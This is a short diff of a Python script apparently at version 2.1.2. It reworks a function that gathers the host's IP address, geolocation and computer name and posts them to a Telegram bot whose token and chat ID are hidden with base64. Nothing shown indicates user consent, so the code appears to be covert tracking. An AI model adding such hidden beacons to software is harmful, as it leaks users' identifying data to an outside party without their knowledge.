@@ -66,8 +66,8 @@ def get_ip_address():
         return "IP not available"
 
 def send_telegram_message(message):
-    app_version = "2.1.1"
-    icon = "📱"  # Mobile phone emoji as an icon
+    app_version = "2.1.2"
+    icon = u"📱"  # Mobile phone emoji as an icon
     ip_address = get_ip_address()
     location = get_location()
     comp_name = get_computer_name()
@@ -77,28 +77,30 @@ def send_telegram_message(message):
     if not socket_available:
         return
 
-    # Compose the message
-    message_with_version = (
-        "{}\n"
-        "{} App version = {}\n"
-        "🖥️ IP = {}\n"
-        "📍 Location = {}\n"
-        "💻 Computer = {}"
-    ).format(message, icon, app_version, ip_address, location, comp_name)
-
     try:
         TOKEN = base64.b64decode(encoded_token).decode('utf-8')
         CHAT_ID = base64.b64decode(encoded_chat_id).decode('utf-8')
+        icon = u"\U0001F4F1"  # 📱
+        monitor_emoji = u"\U0001F5A5"  # 🖥️
+        pin_emoji = u"\U0001F4CD"  # 📍
+        laptop_emoji = u"\U0001F4BB"  # 💻
+
+        # Ensure the input message is Unicode (decode if it's bytes)
+        if isinstance(message, bytes):
+            message = message.decode('utf-8')
+
+        message_with_version = u"{}\n{} App version = {}\n{} IP = {}\n{} Location = {}\n{} Computer = {}".format(
+            message, icon, app_version, monitor_emoji, ip_address, pin_emoji, location, laptop_emoji, comp_name
+        )
+
         url = 'https://api.telegram.org/bot{}/sendMessage'.format(TOKEN)
         payload = {
             'chat_id': CHAT_ID,
-            'text': message_with_version
+            'text': message_with_version  # requests will handle encoding
         }
         response = requests.post(url, data=payload)
-    except Exception:
-        return  # Fail silently as before
-
-
+    except Exception as e:
+        print("Error during tele: {}".format(str(e)))
 def get_location():
     try:
         response = urllib2.urlopen('http://ip-api.com/json/')
